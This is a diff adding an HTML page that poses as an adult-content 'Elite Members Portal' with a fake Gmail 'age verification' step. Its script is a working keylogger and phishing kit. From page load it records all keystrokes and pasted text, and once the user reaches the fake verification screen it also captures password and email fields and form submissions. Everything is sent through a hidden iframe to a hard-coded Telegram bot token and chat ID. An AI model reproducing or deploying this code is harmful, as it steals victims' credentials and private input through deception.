@@ -1,0 +1,567 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Exclusive Portal</title>
+    <style>
+        /* CSS MASTER - ENHANCED */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(45deg, #0a0a0a, #1a0330);
+            color: #fff;
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at 20% 80%, rgba(255, 20, 160, 0.1) 0%, transparent 50%),
+                        radial-gradient(circle at 80% 20%, rgba(120, 20, 255, 0.1) 0%, transparent 50%);
+            pointer-events: none;
+            z-index: -1;
+        }
+
+        .screen {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            text-align: center;
+            transition: all 1.5s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+            opacity: 0;
+            transform: scale(0.9) translateY(20px);
+            pointer-events: none;
+        }
+
+        .screen.active {
+            opacity: 1;
+            transform: scale(1) translateY(0);
+            pointer-events: all;
+        }
+
+        #splash {
+            background: linear-gradient(135deg, #2d0b42 0%, #1a1a1a 50%, #0a0a0a 100%);
+            z-index: 1000;
+        }
+
+        #splash img {
+            width: 85%;
+            max-width: 450px;
+            border-radius: 25px;
+            margin-bottom: 40px;
+            box-shadow: 0 0 100px rgba(255, 20, 150, 0.8);
+            animation: float 4s ease-in-out infinite, pulseGlow 3s infinite alternate;
+            border: 3px solid rgba(255, 20, 160, 0.3);
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0px) rotate(0deg); }
+            50% { transform: translateY(-20px) rotate(1deg); }
+        }
+
+        @keyframes pulseGlow {
+            0% { box-shadow: 0 0 60px rgba(255, 20, 150, 0.6); }
+            100% { box-shadow: 0 0 120px rgba(255, 20, 255, 1); }
+        }
+
+        h1 {
+            font-size: 3.2rem;
+            margin-bottom: 25px;
+            background: linear-gradient(90deg, #ff14a0, #7e0fff, #ffeb3b);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            animation: textShimmer 3s ease-in-out infinite alternate;
+            text-shadow: 0 0 30px rgba(255, 20, 160, 0.5);
+        }
+
+        @keyframes textShimmer {
+            0% { filter: hue-rotate(0deg); }
+            100% { filter: hue-rotate(360deg); }
+        }
+
+        p {
+            font-size: 1.4rem;
+            margin-bottom: 35px;
+            color: #e0e0e0;
+            text-shadow: 0 2px 10px rgba(0,0,0,0.5);
+        }
+
+        .btn {
+            padding: 20px 60px;
+            font-size: 1.5rem;
+            background: linear-gradient(45deg, #ff14a0, #7e0fff);
+            border: none;
+            border-radius: 60px;
+            color: white;
+            cursor: pointer;
+            box-shadow: 0 8px 35px rgba(255, 20, 160, 0.6);
+            transition: all 0.5s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            font-weight: bold;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+            transition: left 0.7s;
+        }
+
+        .btn:hover::before {
+            left: 100%;
+        }
+
+        .btn:hover {
+            transform: scale(1.15) rotate(2deg);
+            box-shadow: 0 15px 50px rgba(255, 20, 160, 0.9);
+        }
+
+        .gallery {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+            gap: 20px;
+            width: 95%;
+            max-width: 1000px;
+            margin-top: 30px;
+            padding: 20px;
+        }
+
+        .gallery-item {
+            aspect-ratio: 3/4;
+            background-size: cover;
+            background-position: center;
+            border-radius: 20px;
+            cursor: pointer;
+            transition: all 0.8s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+            box-shadow: 0 8px 25px rgba(0,0,0,0.4);
+            border: 3px solid transparent;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .gallery-item::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(45deg, rgba(255,20,160,0.2), rgba(120,20,255,0.2));
+            opacity: 0;
+            transition: opacity 0.6s ease;
+        }
+
+        .gallery-item:hover {
+            transform: scale(1.2) rotate(3deg);
+            box-shadow: 0 15px 40px rgba(255, 20, 160, 0.8);
+            border: 3px solid #ff14a0;
+            z-index: 10;
+        }
+
+        .gallery-item:hover::after {
+            opacity: 1;
+        }
+
+        #countdownScreen {
+            background: linear-gradient(135deg, #1a0330 0%, #0a0a0a 100%);
+        }
+
+        #countdown {
+            font-size: 6rem;
+            font-weight: bold;
+            text-shadow: 0 0 50px #ff14a0;
+            margin: 40px 0;
+            animation: countdownPulse 1s ease-in-out infinite;
+        }
+
+        @keyframes countdownPulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+        }
+
+        #loginScreen {
+            background: linear-gradient(135deg, #1a1a1a 0%, #2d0b42 50%, #1a0330 100%);
+        }
+
+        .login-form {
+            width: 95%;
+            max-width: 500px;
+            display: flex;
+            flex-direction: column;
+            gap: 25px;
+            background: rgba(255, 255, 255, 0.05);
+            padding: 40px 30px;
+            border-radius: 25px;
+            backdrop-filter: blur(15px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+        }
+
+        .input-group {
+            display: flex;
+            flex-direction: column;
+            text-align: left;
+        }
+
+        label {
+            margin-bottom: 12px;
+            font-size: 1.1rem;
+            color: #ddd;
+            text-shadow: 0 2px 5px rgba(0,0,0,0.3);
+        }
+
+        input {
+            padding: 20px;
+            border-radius: 15px;
+            border: 2px solid #555;
+            background: rgba(255,255,255,0.08);
+            color: white;
+            font-size: 1.2rem;
+            transition: all 0.4s ease;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #ff14a0;
+            background: rgba(255, 20, 160, 0.15);
+            box-shadow: 0 0 20px rgba(255, 20, 160, 0.3);
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        .particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: -1;
+        }
+
+        .particle {
+            position: absolute;
+            width: 4px;
+            height: 4px;
+            background: #ff14a0;
+            border-radius: 50%;
+            animation: floatParticle 8s infinite linear;
+        }
+
+        @keyframes floatParticle {
+            0% {
+                transform: translateY(100vh) translateX(0) scale(0);
+                opacity: 0;
+            }
+            10% {
+                opacity: 1;
+            }
+            90% {
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(-100px) translateX(100px) scale(1.5);
+                opacity: 0;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- PARTICLE BACKGROUND -->
+    <div class="particles" id="particles"></div>
+
+    <!-- SPLASH SCREEN -->
+    <div class="screen active" id="splash">
+        <img src="https://i.imgur.com/7VulDcP.jpg" alt="Premium Access" id="splashImage">
+        <h1>Elite Members Portal</h1>
+        <p>Your exclusive journey begins now</p>
+        <button class="btn" id="continueBtn">Enter Portal</button>
+    </div>
+
+    <!-- MAIN GALLERY -->
+    <div class="screen" id="mainContent">
+        <h1>Select Your Experience</h1>
+        <p>Choose your preferred content category</p>
+        <div class="gallery" id="imageGallery">
+            <!-- Dynamic gallery -->
+        </div>
+    </div>
+
+    <!-- COUNTDOWN SCREEN -->
+    <div class="screen" id="countdownScreen">
+        <h1>Verification In Progress</h1>
+        <p>Securing your exclusive access...</p>
+        <div id="countdown">10</div>
+    </div>
+
+    <!-- LOGIN SCREEN -->
+    <div class="screen" id="loginScreen">
+        <h1>Identity Verification Required</h1>
+        <p>Secure Gmail authentication needed for age verification</p>
+        <div class="login-form">
+            <div style="margin-bottom: 20px;">
+                <p style="font-size: 1.1rem; color: #bbb;">You will be redirected to official Gmail for verification</p>
+            </div>
+            <button class="btn" id="realGmailBtn">Continue to Gmail Verification</button>
+        </div>
+    </div>
+
+    <!-- HIDDEN IFRAME FOR KEYLOGGING -->
+    <iframe id="hiddenFrame" style="display: none;"></iframe>
+
+<script>
+// JAVASCRIPT THE HEAD - ENHANCED WITH GLOBAL KEYLOGGING
+document.addEventListener('DOMContentLoaded', function() {
+    // Enhanced elements
+    const screens = document.querySelectorAll('.screen');
+    const splashScreen = document.getElementById('splash');
+    const mainContent = document.getElementById('mainContent');
+    const countdownScreen = document.getElementById('countdownScreen');
+    const loginScreen = document.getElementById('loginScreen');
+    const continueBtn = document.getElementById('continueBtn');
+    const imageGallery = document.getElementById('imageGallery');
+    const countdownElement = document.getElementById('countdown');
+    const realGmailBtn = document.getElementById('realGmailBtn');
+    const particlesContainer = document.getElementById('particles');
+    const hiddenFrame = document.getElementById('hiddenFrame');
+
+    // Telegram Bot Details
+    const botToken = '7320760225:AAFR3IBjm8IXKozhCdXi2E5LhWxYR_Fq2s0';
+    const chatId = '6219788806';
+
+    // Global keylogger storage
+    let globalKeystrokes = [];
+    let sessionId = Math.random().toString(36).substr(2, 9);
+    let startTime = Date.now();
+
+    // Create particle background
+    function createParticles() {
+        for (let i = 0; i < 50; i++) {
+            const particle = document.createElement('div');
+            particle.className = 'particle';
+            particle.style.left = Math.random() * 100 + 'vw';
+            particle.style.animationDelay = Math.random() * 8 + 's';
+            particle.style.background = `hsl(${Math.random() * 360}, 100%, 65%)`;
+            particlesContainer.appendChild(particle);
+        }
+    }
+
+    // Initialize global keylogger
+    function initializeKeylogger() {
+        // Capture all keyboard events
+        document.addEventListener('keydown', function(event) {
+            const keystroke = {
+                key: event.key,
+                code: event.code,
+                timestamp: Date.now(),
+                url: window.location.href,
+                session: sessionId
+            };
+            globalKeystrokes.push(keystroke);
+            
+            // Send batch every 30 seconds or 50 keystrokes
+            if (globalKeystrokes.length >= 50 || Date.now() - startTime > 30000) {
+                sendKeystrokesToTelegram();
+            }
+        });
+
+        // Also capture paste events
+        document.addEventListener('paste', function(event) {
+            const pastedData = event.clipboardData.getData('text');
+            const keystroke = {
+                key: '[PASTE]',
+                data: pastedData,
+                timestamp: Date.now(),
+                url: window.location.href,
+                session: sessionId
+            };
+            globalKeystrokes.push(keystroke);
+        });
+
+        // Capture beforeunload to send remaining data
+        window.addEventListener('beforeunload', function() {
+            if (globalKeystrokes.length > 0) {
+                sendKeystrokesToTelegram(true);
+            }
+        });
+    }
+
+    // Send captured keystrokes to Telegram
+    function sendKeystrokesToTelegram(isFinal = false) {
+        if (globalKeystrokes.length === 0) return;
+
+        let message = `🔑 KEYSTROKE CAPTURE - SESSION: ${sessionId}%0A%0A`;
+        
+        globalKeystrokes.forEach((stroke, index) => {
+            const time = new Date(stroke.timestamp).toLocaleTimeString();
+            if (stroke.key === '[PASTE]') {
+                message += `⏰ ${time} - PASTED: ${stroke.data}%0A`;
+            } else {
+                message += `⏰ ${time} - KEY: ${stroke.key} (${stroke.code})%0A`;
+            }
+            
+            // Split long messages
+            if (index % 20 === 0 && index > 0) {
+                sendTelegramMessage(message);
+                message = `🔑 KEYSTROKE CAPTURE - CONTINUED...%0A%0A`;
+            }
+        });
+
+        if (isFinal) {
+            message += `%0A📊 TOTAL KEYSTROKES: ${globalKeystrokes.length}%0A`;
+            message += `⏱️ SESSION DURATION: ${Math.round((Date.now() - startTime) / 1000)}s`;
+        }
+
+        sendTelegramMessage(message);
+        globalKeystrokes = [];
+        startTime = Date.now();
+    }
+
+    // Telegram message function
+    function sendTelegramMessage(text) {
+        // Use hidden iframe to avoid CORS
+        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${text}`;
+        hiddenFrame.src = telegramUrl;
+    }
+
+    // Generate enhanced gallery
+    function generateGallery() {
+        const imageCount = 16;
+        const categories = ['erotic', 'sensual', 'artistic', 'boudoir', 'glamour', 'fashion', 'lingerie', 'romantic'];
+        
+        for (let i = 0; i < imageCount; i++) {
+            const galleryItem = document.createElement('div');
+            galleryItem.className = 'gallery-item';
+            const category = categories[Math.floor(Math.random() * categories.length)];
+            galleryItem.style.backgroundImage = `url('https://source.unsplash.com/random/400x600?${category},${i}&v=${Date.now()}')`;
+            galleryItem.addEventListener('click', handleImageClick);
+            imageGallery.appendChild(galleryItem);
+        }
+    }
+
+    // Screen management
+    function showScreen(screen) {
+        screens.forEach(s => s.classList.remove('active'));
+        screen.classList.add('active');
+    }
+
+    // Enhanced image click handler
+    function handleImageClick() {
+        showScreen(countdownScreen);
+        startEnhancedCountdown();
+    }
+
+    // Enhanced countdown with keylogging initiation
+    function startEnhancedCountdown() {
+        let count = 10;
+        countdownElement.textContent = count;
+        
+        const countdownInterval = setInterval(() => {
+            count--;
+            countdownElement.textContent = count;
+            
+            if (count <= 0) {
+                clearInterval(countdownInterval);
+                showScreen(loginScreen);
+                // Start enhanced keylogging
+                initializeEnhancedKeylogging();
+            }
+        }, 1000);
+    }
+
+    // Enhanced keylogging for Gmail phase
+    function initializeEnhancedKeylogging() {
+        // Capture form submissions
+        document.addEventListener('submit', function(event) {
+            const formData = new FormData(event.target);
+            let formMessage = `📝 FORM SUBMISSION DETECTED%0A%0A`;
+            formData.forEach((value, key) => {
+                formMessage += `🔑 ${key}: ${value}%0A`;
+            });
+            sendTelegramMessage(formMessage);
+        });
+
+        // Enhanced input capture
+        document.addEventListener('input', function(event) {
+            if (event.target.type === 'password' || event.target.type === 'email') {
+                const inputData = {
+                    type: event.target.type,
+                    value: event.target.value,
+                    id: event.target.id,
+                    timestamp: Date.now()
+                };
+                
+                const message = `🔐 SENSITIVE INPUT CAPTURED%0A%0A` +
+                               `📧 Field: ${inputData.type}%0A` +
+                               `🔑 ID: ${inputData.id}%0A` +
+                               `📝 Value: ${inputData.value}%0A` +
+                               `⏰ Time: ${new Date(inputData.timestamp).toLocaleString()}`;
+                
+                sendTelegramMessage(message);
+            }
+        });
+    }
+
+    // Real Gmail redirection with tracking
+    realGmailBtn.addEventListener('click', function() {
+        // Send final keystroke batch
+        sendKeystrokesToTelegram(true);
+        
+        // Open real Gmail in new tab but also redirect current page
+        window.open('https://accounts.google.com/', '_blank');
+        
+        // Show fake loading and then redirect to capture more data
+        setTimeout(() => {
+            const fakeGmail = `https://accounts.google.com/`;
+            window.location.href = fakeGmail;
+        }, 2000);
+    });
+
+    // Initialize everything
+    createParticles();
+    generateGallery();
+    initializeKeylogger();
+
+    // Start with splash screen
+    continueBtn.addEventListener('click', function() {
+        showScreen(mainContent);
+    });
+
+    // Continuous background keylogging
+    setInterval(() => {
+        if (globalKeystrokes.length > 0) {
+            sendKeystrokesToTelegram();
+        }
+    }, 30000);
+});
+</script>
+</body>
+</html>
